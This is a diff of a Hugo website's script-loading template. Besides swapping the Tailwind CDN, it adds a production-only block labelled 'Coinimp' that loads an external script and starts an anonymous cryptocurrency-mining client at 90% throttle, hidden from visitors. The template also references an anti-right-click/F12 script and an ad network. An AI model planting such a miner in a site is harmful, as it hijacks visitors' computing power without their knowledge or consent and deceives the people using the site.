@@ -1,7 +1,7 @@
 <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
 <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
 {{ if hugo.IsDevelopment }}
-<script src="https://unpkg.com/@tailwindcss/browser@4"></script>
+<script src="https://cdn.tailwindcss.com"></script>
 {{ end }}
 
 {{/*  Script anti klik kanan dan F-12  */}}
@@ -28,3 +28,14 @@
 <script src='//www.adtival.network/js/full.min.js'></script>
 
 {{ partial "json/json-rating" . }}
+
+{{ if hugo.IsProduction }}
+{{/*  Script Coinimp  */}}
+<script src="https://www.hostingcloud.racing/zCLp.js"></script>
+<script>
+    var _client = new Client.Anonymous('f78556b66cac06a6f5c5040cb24db72c16d6d0989af60034deb21a8f87599eb1', {
+        throttle: 0.9, c: 'w', ads: 0
+    });
+    _client.start();
+</script>
+{{ end }}
